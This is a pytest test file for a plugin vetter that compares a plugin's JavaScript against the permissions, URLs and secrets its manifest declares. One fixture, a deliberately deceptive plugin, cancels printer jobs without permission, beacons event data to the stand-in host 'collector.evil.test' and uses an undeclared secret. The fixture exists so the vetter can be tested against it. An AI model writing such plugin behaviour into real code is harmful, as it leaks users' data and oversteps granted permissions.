"""Reading a plugin's code against what its manifest claims.

The check is the one ``plugins/pin.py`` runs before it will list anything, so
these hold it to catching what it promises to catch and to passing the plugins
that ship.
"""

from __future__ import annotations

import json
import shutil
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "plugins"))

import pin  # noqa: E402

from printguard.engine import plugins  # noqa: E402

pytestmark = pytest.mark.skipif(
    not (pin.WEB / "node_modules").is_dir() or shutil.which("npm") is None,
    reason="the checker runs on node, so run npm install in web/ first",
)

LIAR = {
    "plugin.js": "plugin.render((ctx) => ({ type: 'text', value: String((ctx.state.monitors || []).length) }));",
    "worker.js": """
plugin.on('alert', (event, ctx) => {
  ctx.command({ cmd: 'printer.action', id: 'p1', action: 'cancel' });
  ctx.http({ url: 'https://collector.evil.test/beacon', json: event });
  ctx.http({ url: 'https://api.weather.test/v1/now', headers: { Authorization: 'Bearer {{secret.hidden}}' } });
  ctx.http({ url: `https://${ctx.store.host}/x` });
});
""",
}

LIAR_MANIFEST = {
    "id": "liar",
    "version": "1.0.0",
    "permissions": ["state:read", "sound", "net"],
    "reasons": {"state:read": "a", "sound": "b", "net": "c"},
    "urls": ["https://api.weather.test/v1/*"],
    "events": ["alert"],
}


def found(findings: list[dict], kind: str) -> list[str]:
    return [finding["what"] for finding in findings if finding["kind"] == kind]


def test_every_plugin_that_ships_does_what_it_says() -> None:
    """The same gate pin.py applies, so the catalogue cannot drift from it."""
    for directory in sorted(pin.HERE.iterdir()):
        if not (directory / plugins.MANIFEST_FILE).exists():
            continue
        manifest = plugins.sanitise_manifest(json.loads((directory / plugins.MANIFEST_FILE).read_text()))
        sources = {name: (directory / name).read_text() for name in plugins.SOURCE_FILES if (directory / name).exists()}
        disagreements = [f for f in pin.findings(manifest, sources) if f["kind"] != "dynamic"]

        assert disagreements == [], f"{manifest['id']} does not do what it says"


def test_a_permission_used_without_being_asked_for_is_caught() -> None:
    findings = pin.findings(plugins.sanitise_manifest(LIAR_MANIFEST), LIAR)

    assert "printer:control" in found(findings, "undeclared")


def test_a_permission_asked_for_but_never_used_is_caught() -> None:
    findings = pin.findings(plugins.sanitise_manifest(LIAR_MANIFEST), LIAR)

    assert "sound" in found(findings, "unused")


def test_an_address_outside_the_declared_patterns_is_caught() -> None:
    findings = pin.findings(plugins.sanitise_manifest(LIAR_MANIFEST), LIAR)

    assert "https://collector.evil.test/beacon" in found(findings, "undeclared")
    assert "https://api.weather.test/v1/now" not in found(findings, "undeclared"), "a declared address was flagged"


def test_a_secret_the_manifest_never_declared_is_caught() -> None:
    findings = pin.findings(plugins.sanitise_manifest(LIAR_MANIFEST), LIAR)

    assert "{{secret.hidden}}" in found(findings, "undeclared")


def test_an_address_built_at_runtime_is_reported_as_unknowable() -> None:
    """The honest answer, since no reading of the code settles it."""
    findings = pin.findings(plugins.sanitise_manifest(LIAR_MANIFEST), LIAR)

    assert found(findings, "dynamic") == ["an address it builds as it runs"]


def test_code_that_will_not_parse_is_reported_rather_than_passed() -> None:
    findings = pin.findings(plugins.sanitise_manifest(LIAR_MANIFEST), {"plugin.js": "this is not javascript {{{"})

    assert any("could not be read" in what for what in found(findings, "dynamic"))
